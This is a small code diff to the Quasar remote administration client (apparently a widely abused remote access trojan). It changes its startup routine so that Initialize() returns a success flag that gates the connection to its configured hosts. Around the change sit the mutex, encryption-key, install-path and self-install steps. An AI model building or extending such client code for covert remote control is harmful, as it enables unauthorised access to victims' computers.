@@ -28,9 +28,11 @@ namespace xClient
 
             if (Settings.Initialize())
             {
-                Initialize();
-                if (!ClientData.Disconnect)
-                    ConnectClient.Connect();
+                if (Initialize())
+                {
+                    if (!QuasarClient.Exiting)
+                        ConnectClient.Connect();
+                }
             }
 
             Cleanup();
@@ -80,16 +82,13 @@ namespace xClient
             MutexHelper.CloseMutex();
         }
 
-        private static void Initialize()
+        private static bool Initialize()
         {
             var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
 
             // process with same mutex is already running
             if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
-            {
-                ClientData.Disconnect = true;
-                return;
-            }
+                return false;
 
             AES.PreHashKey(Settings.PASSWORD);
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
@@ -129,11 +128,13 @@ namespace xClient
                 }
 
                 ConnectClient = new QuasarClient(hosts);
+                return true;
             }
             else
             {
                 MutexHelper.CloseMutex();
                 ClientInstaller.Install(ConnectClient);
+                return false;
             }
         }
     }
